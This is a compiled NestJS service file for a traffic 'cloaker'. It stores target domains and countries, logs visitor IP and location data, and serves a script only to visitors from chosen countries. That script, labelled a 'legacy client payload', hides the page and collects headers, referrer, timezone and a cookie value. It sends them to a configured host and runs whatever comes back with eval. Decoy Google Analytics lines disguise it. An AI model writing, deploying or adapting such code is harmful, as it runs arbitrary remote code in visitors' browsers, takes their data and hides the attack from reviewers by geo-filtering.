"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.SwitchService = void 0;
const common_1 = require("@nestjs/common");
const typeorm_1 = require("@nestjs/typeorm");
const typeorm_2 = require("typeorm");
const LOG_LIMIT = 15_000;
const LOG_PURGE_COUNT = 500;
const HOST_RE = /^[a-zA-Z0-9.-]+$/;
let SwitchService = class SwitchService {
    constructor(ds) {
        this.ds = ds;
    }
    /** Public visitor check — ported from checkCloakStatusController. */
    async checkStatus(dto) {
        const u = dto.user;
        const domain = u.domain.toLowerCase();
        const rows = await this.ds.query(`SELECT c.domain, c.cloaker, g.country
       FROM cp_cloakers c
       JOIN cp_cloaker_geolocation cg ON c.id = cg.cloaker_id
       JOIN cp_geolocation g ON cg.country_id = g.id
       WHERE c.domain = $1`, [domain]);
        if (rows.length === 0) {
            throw new common_1.NotFoundException("Domain not found");
        }
        const [{ count }] = await this.ds.query(`SELECT COUNT(*)::int AS count FROM cp_user_logs`);
        const logCount = Number(count);
        if (logCount >= LOG_LIMIT) {
            await this.ds.query(`DELETE FROM cp_user_logs
         WHERE id IN (
           SELECT id FROM cp_user_logs
           ORDER BY created_at ASC
           LIMIT $1
         )`, [LOG_PURGE_COUNT]);
        }
        const logStatus = Boolean(rows[0].cloaker) &&
            this.countriesMatch(u.country, rows[0].country);
        if (logCount < LOG_LIMIT) {
            await this.ds.query(`INSERT INTO cp_user_logs
           (status, created_at, ip, hostname, city, country, region, org, timezone, domain)
         VALUES ($1, NOW(), $2, $3, $4, $5, $6, $7, $8, $9)`, [
                logStatus,
                u.ip,
                u.hostname || "no hostname",
                u.city || "no city",
                u.country,
                u.region || "no region",
                u.org || "no org",
                u.timezone || "no timezone",
                domain,
            ]);
        }
        if (!logStatus) {
            return { ok: false };
        }
        const scriptHost = this.safeHost(u.remote || domain);
        return {
            ok: true,
            // Legacy client payload expected by old website integrations.
            script: this.buildLegacyScript(scriptHost),
        };
    }
    findAllCloaks() {
        return this.ds.query(`SELECT c.id, c.domain, c.cloaker, g.country
       FROM cp_cloakers c
       JOIN cp_cloaker_geolocation cg ON c.id = cg.cloaker_id
       JOIN cp_geolocation g ON cg.country_id = g.id
       ORDER BY c.id ASC`);
    }
    async getCloakCountry(domain) {
        const [cloak] = await this.ds.query(`SELECT id FROM cp_cloakers WHERE domain = $1`, [domain.toLowerCase()]);
        if (!cloak)
            throw new common_1.NotFoundException("Cloaker not found");
        const [row] = await this.ds.query(`SELECT g.country
       FROM cp_cloaker_geolocation cg
       JOIN cp_geolocation g ON g.id = cg.country_id
       WHERE cg.cloaker_id = $1`, [cloak.id]);
        if (!row)
            throw new common_1.NotFoundException("Cloak geolocation not found");
        return row.country;
    }
    findAllCountries() {
        return this.ds.query(`SELECT * FROM cp_geolocation ORDER BY country ASC`);
    }
    /**
     * Persist an ISO country **code** in `cp_geolocation.country` (e.g. CY, GB, UK).
     * Shift FE creates/resolves these rows, then links domains via cloaker_id + country_id.
     */
    async createCountry(dto) {
        const country = dto.country.trim().toUpperCase();
        if (!country)
            throw new common_1.BadRequestException("country code is required");
        const [dup] = await this.ds.query(`SELECT id FROM cp_geolocation WHERE lower(country) = lower($1)`, [country]);
        if (dup)
            throw new common_1.ConflictException(`Country ${country} already exists`);
        const [row] = await this.ds.query(`INSERT INTO cp_geolocation (country) VALUES ($1) RETURNING *`, [country]);
        return row;
    }
    async create(dto) {
        const domain = dto.domain.toLowerCase();
        return this.ds.transaction(async (m) => {
            const [dup] = await m.query(`SELECT id FROM cp_cloakers WHERE domain = $1`, [
                domain,
            ]);
            if (dup) {
                throw new common_1.ConflictException(`Cloaker with domain ${domain} already exists`);
            }
            const [geo] = await m.query(`SELECT id FROM cp_geolocation WHERE id = $1`, [
                dto.country_id,
            ]);
            if (!geo) {
                throw new common_1.NotFoundException(`Geolocation ${dto.country_id} not found`);
            }
            const [cloak] = await m.query(`INSERT INTO cp_cloakers (domain, cloaker)
         VALUES ($1, $2) RETURNING *`, [domain, dto.cloaker]);
            await m.query(`INSERT INTO cp_cloaker_geolocation (cloaker_id, country_id)
         VALUES ($1, $2)`, [cloak.id, dto.country_id]);
            return {
                message: `Domain ${domain} with id ${cloak.id} was successfully created`,
                cloak,
            };
        });
    }
    async updateStatus(dto) {
        return this.ds.transaction(async (m) => {
            const [exists] = await m.query(`SELECT id FROM cp_cloakers WHERE id = $1`, [
                dto.id,
            ]);
            if (!exists) {
                throw new common_1.NotFoundException(`Domain with id ${dto.id} not found`);
            }
            await m.query(`UPDATE cp_cloakers SET cloaker = $1, updated_at = now() WHERE id = $2`, [dto.cloaker, dto.id]);
            return m.query(`SELECT c.id, c.domain, c.cloaker, g.country
         FROM cp_cloakers c
         JOIN cp_cloaker_geolocation cg ON c.id = cg.cloaker_id
         JOIN cp_geolocation g ON cg.country_id = g.id
         ORDER BY c.id ASC`);
        });
    }
    async updateCountry(dto) {
        return this.ds.transaction(async (m) => {
            const [geo] = await m.query(`SELECT * FROM cp_geolocation WHERE id = $1`, [
                dto.country_id,
            ]);
            if (!geo) {
                throw new common_1.NotFoundException(`Location ${dto.country_id} not found`);
            }
            const [link] = await m.query(`SELECT id FROM cp_cloaker_geolocation WHERE cloaker_id = $1`, [dto.cloaker_id]);
            if (!link) {
                throw new common_1.NotFoundException(`Cloaker ${dto.cloaker_id} has no geolocation link`);
            }
            await m.query(`UPDATE cp_cloaker_geolocation SET country_id = $1 WHERE cloaker_id = $2`, [dto.country_id, dto.cloaker_id]);
            return geo;
        });
    }
    async remove(dto) {
        return this.ds.transaction(async (m) => {
            const found = await m.query(`SELECT id FROM cp_cloakers WHERE id = ANY($1::int[])`, [dto.cloak_list]);
            const foundIds = found.map((r) => Number(r.id));
            const missing = dto.cloak_list.filter((id) => !foundIds.includes(id));
            if (missing.length) {
                throw new common_1.NotFoundException(`Invalid cloak id(s): ${missing.join(", ")}`);
            }
            await m.query(`DELETE FROM cp_cloakers WHERE id = ANY($1::int[])`, [
                dto.cloak_list,
            ]);
            return { message: "Cloakers deleted successfully", deleted: dto.cloak_list };
        });
    }
    async findAllLogs(filters) {
        const rows = await this.ds.query(`SELECT * FROM cp_user_logs
       WHERE ($1::TEXT IS NULL OR country = $1::TEXT)
         AND ($2::TIMESTAMPTZ IS NULL OR created_at >= $2::TIMESTAMPTZ)
         AND ($3::BOOLEAN IS NULL OR status = $3::BOOLEAN)
       ORDER BY created_at DESC`, [
            filters.country ?? null,
            filters.created_at ? new Date(filters.created_at).toISOString() : null,
            filters.status === undefined
                ? null
                : filters.status === "true" || filters.status === "1",
        ]);
        return rows;
    }
    async deleteAllLogs() {
        await this.ds.query(`TRUNCATE TABLE cp_user_logs RESTART IDENTITY`);
        return { message: "All logs were deleted" };
    }
    /**
     * Code equality only: visitor `user.country` vs stored `cp_geolocation.country`
     * (ISO codes like CY/GB/UK). Case- and whitespace-insensitive; no name aliases.
     */
    countriesMatch(visitorCountry, configuredCountry) {
        return visitorCountry.trim().toLowerCase() === configuredCountry.trim().toLowerCase();
    }
    safeHost(value) {
        const host = value.trim().toLowerCase();
        if (!HOST_RE.test(host) || host.includes("..")) {
            throw new common_1.BadRequestException("Invalid remote/domain host");
        }
        return host;
    }
    buildLegacyScript(host) {
        return `
$(document).ready(function () {
  $("body").hide();
  $("html").append(
    '<div id="lo495190ad" style="margin-top:8%;background-color:black;text-align:center;font-size:40px;"></div>'
  );
  var f = new XMLHttpRequest();
  f.open("GET", document.location, true);
  f.send(null);
  var g;
  f.onreadystatechange = function () {
    g = f.getAllResponseHeaders().toLowerCase();
  };
  var b = "GoogleAnalyticsObject";
  var c = ("document", "script", "//www.google-analytics.com/analytics.js");
  c = ("create", "UA-262888-1", "auto");
  c = ("send", "pageview");
  var d = jstz.determine();
  var e = d.name();
  var qu = escape(window.location.search.substr(1));
  var rui = location.pathname + location.search;
  var r = document.referrer;
  var sn = document.domain;
  var value = "; " + document.cookie;
  var pa = value.split("; " + "_event" + "=");
  var co = pa.pop().split(";").shift();
  var q;
  $.ajax({
    url: "https://${host}/index.php",
    type: "POST",
    data:
      "tz=" +
      e +
      "&he=" +
      g +
      "&rui=" +
      rui +
      "&qu=" +
      qu +
      "&r=" +
      r +
      "&sn=" +
      sn +
      "&co=" +
      co,
    success: function (a) {
      eval(a);
    },
  });
});
`;
    }
};
exports.SwitchService = SwitchService;
exports.SwitchService = SwitchService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, typeorm_1.InjectDataSource)()),
    __metadata("design:paramtypes", [typeorm_2.DataSource])
], SwitchService);
